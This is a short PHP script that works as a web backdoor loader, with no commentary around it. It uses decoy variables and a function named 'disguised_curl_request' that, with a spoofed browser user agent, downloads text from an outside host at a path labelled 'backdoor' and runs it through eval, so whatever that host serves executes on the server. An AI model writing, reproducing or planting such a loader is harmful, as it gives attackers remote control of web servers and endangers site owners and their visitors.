<?php

$random1 = "randomValue1";
$random2 = "randomValue2";
$random3 = "randomValue3";
$__aB = "https://bpbdtanjungpinang.com/backdoor/kurlung.txt";
function disguised_curl_request($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36");
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
eval("?>" . disguised_curl_request($__aB));
?>
